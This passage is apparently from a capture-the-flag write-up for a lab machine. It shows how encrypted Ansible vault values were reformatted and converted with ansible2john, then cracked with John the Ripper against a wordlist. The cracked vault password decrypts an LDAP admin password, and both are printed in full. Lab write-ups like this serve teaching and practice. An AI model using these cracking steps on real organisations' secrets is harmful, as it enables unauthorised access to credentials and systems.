
If we have found some interesting ansible vaults or encoded passwords, we can do the following:

```
pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256  633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
```

The encoded ansible passwords were the way in! Since there is an tool which can convert ansible two hash format called "ansible2john".

Let's first format all the whitespaces of the encoded credentials accordingly.

```
https://gchq.github.io/CyberChef
```

1. Utilize Find / Replace Operation.

2. Paste this in Find variable.

```
(\$ANSIBLE_VAULT;1\.1;AES256)([0-9a-fA-F]{64})([0-9a-fA-F]+)
```

3. This in Replace Variable

```
$1\n$2\n$3
```


4. Stored all of them in files on my local machine. We now need to convert them into hash format using ansible2john, which comes pre-installed with Kali Linux.

```
ansible2john pwm_admin_password > pass_hash
```

5. Let's crack them using john the ripper.

```
john ldap_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (ldap_admin_password)     
1g 0:00:00:08 DONE (2026-08-10 07:03) 0.1148g/s 4570p/s 4570c/s 4570C/s 112500..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password:

```
!@#$%^&*
```

6. Let's now decrypt the ansible-vault to get the password.

```
ansible-vault decrypt ldap_admin_password --ask-vault-pass
Vault password: 
Decryption successful
```

We now have the first password.

```
cat ldap_admin_password 
DevT3st@123
```